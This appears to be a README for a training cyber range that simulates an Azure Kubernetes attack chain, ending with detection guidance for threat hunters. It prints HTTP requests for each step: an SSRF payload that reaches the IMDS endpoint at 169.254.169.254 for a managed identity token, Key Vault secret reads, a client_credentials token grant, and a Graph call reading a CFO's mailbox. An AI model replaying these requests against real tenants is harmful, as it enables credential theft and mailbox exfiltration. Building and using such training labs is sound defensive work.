# AKS Attack Chain Cyber Range

## Scenario Overview

**AKS HR App SSRF Attack** simulates a cloud-native attack chain targeting Azure Kubernetes Service (AKS). A threat actor exploits an SSRF vulnerability in a containerized HR application to steal Azure credentials, pivot through Kubernetes and Azure services, and exfiltrate sensitive email data from Exchange 365.

| Attribute | Value |
|-----------|-------|
| Difficulty | Advanced |
| Duration | 3-5 hours |
| Focus Areas | Cloud Security, Kubernetes Security, Threat Hunting, Azure Log Analysis |
| MITRE ATT&CK Coverage | Initial Access, Execution, Credential Access, Discovery, Privilege Escalation, Lateral Movement, Collection, Exfiltration |

## Attack Narrative

A threat actor discovers a public-facing HR application running in an Azure Kubernetes Service (AKS) cluster. The application has a document preview feature that contains an SSRF vulnerability, allowing the attacker to access internal services.

The attacker exploits the SSRF to reach the Azure Instance Metadata Service (IMDS) at 169.254.169.254, stealing the pod's Managed Identity token. This token grants access to multiple Azure services including the Kubernetes API, Key Vault, ARM API, and Azure Functions.

Using the stolen token, the attacker enumerates the Kubernetes cluster, discovering secrets and configuration data. They then access Azure Key Vault to extract Service Principal credentials configured for Exchange 365 access.

With the Exchange SP credentials, the attacker authenticates to Azure AD using the client_credentials grant and obtains a Graph API token. The attack culminates in email exfiltration from the CFO's mailbox, accessing sensitive financial and M&A communications.

## Infrastructure

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          AKS ATTACK CHAIN                                    │
│                                                                             │
│   ATTACKER                                                                  │
│       │                                                                     │
│       ▼                                                                     │
│  ┌──────────┐                                                               │
│  │  Front   │                                                               │
│  │   Door   │                                                               │
│  └────┬─────┘                                                               │
│       │                                                                     │
│       ▼                                                                     │
│  ┌─────────────────────────────────────────────┐                           │
│  │         Azure Kubernetes Cluster            │                           │
│  │  ┌─────────────────────────────────────┐   │                           │
│  │  │  Kubernetes Node                     │   │                           │
│  │  │  ┌─────────────┐                    │   │                           │
│  │  │  │   HR App    │  SSRF → Shell      │   │                           │
│  │  │  │    Pod      │                    │   │                           │
│  │  │  └──────┬──────┘                    │   │                           │
│  │  └─────────┼────────────────────────────┘   │                           │
│  └────────────┼─────────────────────────────────┘                           │
│               │                                                             │
│               ▼                                                             │
│        ┌──────────────┐                                                     │
│        │     IMDS     │                                                     │
│        │169.254.169.254                                                     │
│        └──────┬───────┘                                                     │
│               │                                                             │
│               │ Managed Identity Token                                      │
│               │                                                             │
│    ┌──────────┼──────────┬──────────────┐                                  │
│    ▼          ▼          ▼              ▼                                  │
│ ┌──────┐  ┌──────┐  ┌──────────┐  ┌──────────┐                            │
│ │ K8s  │  │ ARM  │  │ KeyVault │  │Functions │                            │
│ │ API  │  │ API  │  │          │  │          │                            │
│ └──┬───┘  └──────┘  └────┬─────┘  └──────────┘                            │
│    │                     │                                                  │
│    │ Discovery           │ SP Credentials                                   │
│    │                     ▼                                                  │
│    │              ┌──────────────┐                                          │
│    │              │   Azure AD   │                                          │
│    │              │ (OAuth2 STS) │                                          │
│    │              └──────┬───────┘                                          │
│    │                     │                                                  │
│    │                     │ Graph API Token                                  │
│    │                     ▼                                                  │
│    │              ┌──────────────┐                                          │
│    │              │   Exchange   │                                          │
│    │              │     365      │                                          │
│    │              └──────┬───────┘                                          │
│    │                     │                                                  │
│    │                     ▼                                                  │
│    │                EXFILTRATION                                            │
│    │               (CFO Mailbox)                                            │
│    │                                                                        │
│    └─► Pods, Secrets, ConfigMaps                                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Services

| Service | Role | Network |
|---------|------|---------|
| Front Door | WAF / Reverse Proxy (entry point) | DMZ |
| AKS Pod (HR App) | Vulnerable containerized HR application | DMZ, Corp, Mgmt |
| Kubernetes API | Control plane for cluster management | Mgmt |
| IMDS | Managed Identity token provider | Mgmt |
| Azure AD | OAuth2 authentication (STS) | Mgmt |
| ARM API | Resource Manager (discovery) | Mgmt |
| Key Vault | Secret storage (SP credentials) | Corp |
| Azure Functions | Serverless compute (lateral movement) | Corp, Mgmt |
| Exchange 365 | Email service (exfiltration target) | Corp |
| Azure Sentinel | SIEM / Log aggregation | All |

## Attack Steps

### Step 1: Initial Access - SSRF Exploitation (T1190)

The attacker discovers a document preview feature in the HR application via `/api/status` which reveals `"document_preview": true`. By fuzzing common API patterns (`/api/document/*`, `/api/preview`), they find the vulnerable endpoint. Manipulating the URL parameter triggers an SSRF vulnerability to access the Azure Instance Metadata Service.

```http
POST /api/document/preview HTTP/1.1
Host: hr-app.aks.internal
Content-Type: application/json

{
    "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
}
```

The response contains the pod's Managed Identity OAuth token, granting access to Azure services.

### Step 2: Credential Access - IMDS Token Theft (T1552.005)

The SSRF vulnerability allows direct access to IMDS, returning the Managed Identity token:

```json
{
    "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...",
    "expires_in": "3600",
    "resource": "https://management.azure.com/"
}
```

This token grants access to Kubernetes API, Key Vault, ARM API, and Azure Functions.

### Step 3: Discovery - Kubernetes API Enumeration (T1613)

Using the stolen token, the attacker enumerates the Kubernetes cluster:

```http
GET /api/v1/namespaces HTTP/1.1
Host: kubernetes.default.svc
Authorization: Bearer <managed_identity_token>
```

The attacker discovers:
- Namespaces (production, kube-system)
- Pods running in the cluster
- Secrets containing configuration data
- ConfigMaps with service endpoints

### Step 4: Key Vault Access - SP Credential Extraction (T1552.004)

The attacker uses the Managed Identity token to access Key Vault and retrieve Exchange Service Principal credentials:

```http
GET /secrets/exchange-sp-client-id
Host: prod-secrets-kv.vault.azure.net
Authorization: Bearer <managed_identity_token>
```

```http
GET /secrets/exchange-sp-client-secret
Host: prod-secrets-kv.vault.azure.net
Authorization: Bearer <managed_identity_token>
```

### Step 5: Azure AD Token Acquisition (T1078.004)

With the SP credentials, the attacker authenticates to Azure AD using the client_credentials grant:

```http
POST /87654321-4321-4321-4321-cba987654321/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=exchange-mail-reader-app-id
&client_secret=<extracted_secret>
&scope=https://graph.microsoft.com/.default
```

This returns a Graph API token scoped for Exchange access.

### Step 6: Data Exfiltration - Email Access (T1114.002)

The attacker uses the Graph API token to access the CFO's mailbox:

```http
GET /v1.0/users/cfo@contoso.com/messages HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer <graph_api_token>
```

Sensitive emails are exfiltrated, including:
- Q4 Financial Results (CONFIDENTIAL)
- Acquisition Target List
- Bank Account Details for Wire Transfer

## Benign Activity & Baseline Data

To create a realistic threat hunting environment, the scenario seeds benign data alongside attack artifacts.

### Baseline Infrastructure

| Category | Benign Data | Attack Data |
|----------|-------------|-------------|
| Kubernetes Namespaces | kube-system, kube-public | production (with secrets) |
| Key Vault Secrets | app-insights-key, redis-connection-dev | exchange-sp-client-id, exchange-sp-client-secret |
| Service Principals | 18 benign application identities | Exchange Mail Reader SP |
| Exchange Mailboxes | Standard user mailboxes | CFO mailbox with sensitive content |

### Historical Logs

At startup, the scenario generates **48 hours of historical logs** representing normal business operations:

- Routine Kubernetes pod operations and health checks
- Normal Azure AD sign-ins from legitimate users
- Regular Key Vault access for application secrets
- Standard Graph API calls for calendar/contacts

This baseline provides context for anomaly detection—attack activity should stand out against the background of normal operations.

## Service Endpoints

| Service | URL |
|---------|-----|
| Front Door (Entry) | http://localhost:8086 |
| AKS Pod (HR App) | http://localhost:8085 |
| Kubernetes API | https://localhost:6443 |
| Azure AD | http://localhost:8081 |
| IMDS | http://localhost:8080 |
| Key Vault | https://localhost:8200 |
| ARM API | https://localhost:8445 |
| Azure Functions | http://localhost:7071 |
| Exchange 365 | https://localhost:8443 |
| Azure Sentinel | http://localhost:5000 |

## Detection Opportunities

### Kubernetes Audit Logs
- List operations on secrets in production namespace
- Unusual API access patterns from pod service accounts
- Authentication attempts with Managed Identity tokens

### Azure Activity Logs
- Key Vault secret reads from unexpected principals
- ARM API enumeration patterns

### Exchange MailItemsAccessed Logs
- External access to executive mailboxes
- Bulk message retrieval operations
- Access from new application IDs

### Azure AD Sign-In Logs
- client_credentials grants for Graph API access
- Token issuance for Exchange-scoped permissions

## References

- [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/)
- [Azure Instance Metadata Service](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [Kubernetes Audit Logging](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
- [Microsoft Graph Mail API](https://docs.microsoft.com/en-us/graph/api/resources/mail-api-overview)

---

*Generated by SABER-SIM (Security Attack Behavior Extraction & Replay Simulator)*
